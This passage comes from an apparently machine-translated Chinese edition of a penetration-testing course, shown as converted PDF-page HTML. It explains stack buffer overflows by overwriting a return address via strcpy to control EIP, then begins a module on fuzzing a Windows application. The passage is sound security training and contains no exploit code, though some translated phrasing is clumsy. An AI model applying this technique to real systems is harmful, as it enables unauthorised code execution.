<div style="position:absolute;top:51865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">片刻。</font></font></nobr></div>
<div style="position:absolute;top:51898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数已完成执行并且所有数据都已复制到</font></font></nobr></div>
<div style="position:absolute;top:51917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标缓冲区，是时候</font><font style="vertical-align: inherit;">通过RETN汇编指令</font><font style="vertical-align: inherit;">将执行返回到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:51936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 199 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52204;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 199：从 strcpy 返回到 main</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此 RETN 指令“弹出”堆栈顶部的值（0x004015AF，相对偏移量 -0x14 in</font></font></nobr></div>
<div style="position:absolute;top:52255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 199) 写入 EIP 寄存器，指示 CPU 接下来执行该位置的代码。</font></font></nobr></div>
<div style="position:absolute;top:52287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们单步执行此 RETN 指令（使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Step into</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），我们将返回到</font></font></nobr></div>
<div style="position:absolute;top:52307;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数地址 0x004015AF，正如预期的那样，因为这是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用</font><font style="vertical-align: inherit;">之后的下一个地址</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:52447;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="45"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 45 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:52480;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:53557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:53557;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:53557;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">365</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52945;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 200：从 strcpy 返回到 main 函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一条指令</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MOV EAX,0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相当于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 0；</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的原始源代码和</font></font></nobr></div>
<div style="position:absolute;top:52995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向操作系统发送退出状态 0。</font></font></nobr></div>
<div style="position:absolute;top:53028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至此，我们已经到了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数的结尾。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">308</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能将简单地返回</font></font></nobr></div>
<div style="position:absolute;top:53047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行最初设置和调用的编译器创建的第一段代码</font></font></nobr></div>
<div style="position:absolute;top:53066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数本身。</font></font></nobr></div>
<div style="position:absolute;top:53099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一条指令 LEAVE, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">309</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将返回地址放在偏移量 0x4C（从我们的</font></font></nobr></div>
<div style="position:absolute;top:53119;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">局部变量）到栈顶。</font><font style="vertical-align: inherit;">然后，RETN汇编指令（图201）</font></font></nobr></div>
<div style="position:absolute;top:53138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从栈顶弹出主函数返回地址并在那里执行代码。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:53487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">308 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Function_prologue#Epilogue</font></font></font></nobr></div>
<div style="position:absolute;top:53507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">309 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c9x.me), https://c9x.me/x86/html/file_module_x86_id_154.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:53635;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="46"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 46 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:53668;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:54745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:54745;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:54745;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">366</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53986;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 201：从 main 返回到父函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们必须在这一点上逗留更长时间才能了解更大的图景。</font><font style="vertical-align: inherit;">当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制</font></font></nobr></div>
<div style="position:absolute;top:54036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从命令行参数到堆栈</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">的输入字符串（12 个字节）</font><font style="vertical-align: inherit;">，它开始</font></font></nobr></div>
<div style="position:absolute;top:54055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在地址 0x0065FE70 及以后写入。</font><font style="vertical-align: inherit;">在这种情况下，没有边界检查</font></font></nobr></div>
<div style="position:absolute;top:54074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 C 代码中副本的大小，因此如果我们将更长的字符串作为输入传递给我们的程序，</font></font></nobr></div>
<div style="position:absolute;top:54094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">足够的数据将被写入堆栈，最终我们应该能够覆盖返回</font></font></nobr></div>
<div style="position:absolute;top:54113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位于</font><i><font style="vertical-align: inherit;">缓冲区</font></i><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">偏移 0x4C 处</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">父函数的</font><font style="vertical-align: inherit;">地址</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这表示</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:54132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果正确执行返回地址覆盖，指令指针将在</font></font></nobr></div>
<div style="position:absolute;top:54152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的控件，因为当</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数返回到</font></font></nobr></div>
<div style="position:absolute;top:54171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">父母。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:54206;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:54206;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">溢出缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的例子中，我们只写了 64 个字节中的 12 个字节，所以程序运行了</font></font></nobr></div>
<div style="position:absolute;top:54263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并按预期干净地退出。</font><font style="vertical-align: inherit;">但是，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址（0x0065FE70）和</font></font></nobr></div>
<div style="position:absolute;top:54282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数的返回地址是76（十六进制0x4c）字节，因此，如果我们提供80“A”的作为一个参数，</font></font></nobr></div>
<div style="position:absolute;top:54302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们应该被拷贝到堆栈和写过去所分配的边界</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到</font></font></nobr></div>
<div style="position:absolute;top:54321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标返回地址，如图 202 所示。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:54823;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="47"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 47 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54856;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:55933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:55933;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:55933;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">367</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55277;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 202：缓冲区溢出图示</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要做到这一点，我们可以重新打开与应用程序</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并输入80 A的的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">后</font></font></nobr></div>
<div style="position:absolute;top:55327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">上放置一个断点</font><font style="vertical-align: inherit;">并继续执行直到返回，我们最终得到</font></font></nobr></div>
<div style="position:absolute;top:55347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 203 所示的堆栈布局。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55735;left:213"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图203：主父函数的返回地址在栈上被覆盖</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们继续执行，继续执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数中</font><font style="vertical-align: inherit;">的RETN指令</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:55786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被覆盖的返回地址将弹出到 EIP 中。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:56011;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="48"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 48 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:56044;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:57121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:57121;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:57121;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">368</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:56509;left:245"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图204：main函数返回0x41414141无效地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，CPU 尝试从 0x41414141 读取下一条指令。</font><font style="vertical-align: inherit;">由于这不是有效的</font></font></nobr></div>
<div style="position:absolute;top:56559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程内存空间中的地址，CPU 触发访问冲突，崩溃</font></font></nobr></div>
<div style="position:absolute;top:56578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:56776;left:388"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 205：EIP 覆盖</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再一次，重要的是要记住，CPU 使用 EIP 寄存器来指导代码</font></font></nobr></div>
<div style="position:absolute;top:56826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在程序集级别执行。</font><font style="vertical-align: inherit;">因此，获得对 EIP 的可靠控制将使我们能够</font></font></nobr></div>
<div style="position:absolute;top:56845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行我们想要的任何汇编代码，并最终通过 shellcode 获得一个反向 shell</font></font></nobr></div>
<div style="position:absolute;top:56865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受攻击的应用程序的上下文。</font><font style="vertical-align: inherit;">我们将在后面的模块中完成此操作。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56899;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:56899;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复本节中显示的步骤，查看复制到堆栈中的 12 个 A。</font></font></nobr></div>
<div style="position:absolute;top:56961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 提供至少 80 个 A 并验证</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之后的 EIP</font><font style="vertical-align: inherit;">将包含值 41414141。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.3 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个模块中，我们介绍了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背后的原理</font><font style="vertical-align: inherit;">，它是一种内存</font></font></nobr></div>
<div style="position:absolute;top:57060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">腐败漏洞。</font><font style="vertical-align: inherit;">我们回顾了如何使用程序存储器，如何发生缓冲区溢出，</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:57199;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="49"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 49 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57232;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:58309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:58309;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:58309;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">369</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及如何使用溢出来控制应用程序的执行流程。</font><font style="vertical-align: inherit;">这提供了一个</font></font></nobr></div>
<div style="position:absolute;top:57347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很好地了解使这种攻击成为可能的条件，并将在以后帮助我们</font></font></nobr></div>
<div style="position:absolute;top:57366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，因为我们开发了利用这种类型的漏洞的漏洞。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:58387;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="50"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 50 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58420;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:59497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:59497;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:59497;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">370</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:58510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.3.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:58536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11. Windows 缓冲区溢出</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将演示如何发现和利用 SyncBreeze 中的漏洞</font></font></nobr></div>
<div style="position:absolute;top:58600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">310</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们正在检查一个已知漏洞，但我们将逐步完成步骤</font></font></nobr></div>
<div style="position:absolute;top:58619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要“发现它”，并且不会依赖先前的研究来进行此应用程序。</font><font style="vertical-align: inherit;">这会</font></font></nobr></div>
<div style="position:absolute;top:58639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本质上复制了发现和利用远程缓冲区溢出的过程。</font></font></nobr></div>
<div style="position:absolute;top:58671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程需要几个步骤。</font><font style="vertical-align: inherit;">首先，我们必须发现代码中的一个漏洞（没有</font></font></nobr></div>
<div style="position:absolute;top:58690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问源）。</font><font style="vertical-align: inherit;">然后，我们必须以这样一种方式来创建我们的输入，以便我们控制</font></font></nobr></div>
<div style="position:absolute;top:58710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键 CPU 寄存器。</font><font style="vertical-align: inherit;">最后，我们需要操纵内存以获得可靠的远程代码</font></font></nobr></div>
<div style="position:absolute;top:58729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:58767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1 发现漏洞</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，有三种主要技术可用于识别应用程序中的缺陷。</font><font style="vertical-align: inherit;">来源</font></font></nobr></div>
<div style="position:absolute;top:58828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果可用，代码审查可能是最简单的。</font><font style="vertical-align: inherit;">如果不是，我们可以使用逆向工程</font></font></nobr></div>
<div style="position:absolute;top:58847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术或模糊测试以发现漏洞。</font><font style="vertical-align: inherit;">在本模块中，我们将专注于模糊测试。</font></font></nobr></div>
<div style="position:absolute;top:58880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模糊测试的目标是为目标应用程序提供未正确处理的输入，</font></font></nobr></div>
<div style="position:absolute;top:58899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致应用程序崩溃。</font><font style="vertical-align: inherit;">在最基本的形式中，此输入以编程方式生成</font></font></nobr></div>
<div style="position:absolute;top:58918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要畸形。</font><font style="vertical-align: inherit;">如果由于处理格式错误的输入数据而导致崩溃，则可能表明</font></font></nobr></div>
<div style="position:absolute;top:58938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在潜在的可利用漏洞，例如缓冲区溢出。</font></font></nobr></div>
<div style="position:absolute;top:58970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用许多不同类别的模糊测试工具和技术</font></font></nobr></div>
<div style="position:absolute;top:58990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的特殊需求。</font><font style="vertical-align: inherit;">如果模糊器创建格式错误的应用程序，则它被认为是基于生成的</font></font></nobr></div>
<div style="position:absolute;top:59009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从头开始输入，遵循文件格式或网络协议规范等内容。</font><font style="vertical-align: inherit;">突变——</font></font></nobr></div>
<div style="position:absolute;top:59028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于模糊器通过使用位翻转等技术来改变现有的输入来创建一个畸形的</font></font></nobr></div>
<div style="position:absolute;top:59048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始输入的变体。</font></font></nobr></div>
<div style="position:absolute;top:59081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般来说，一个知道应用程序输入格式的模糊器可以归类为</font></font></nobr></div>
<div style="position:absolute;top:59100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">智能模糊器。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">311</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
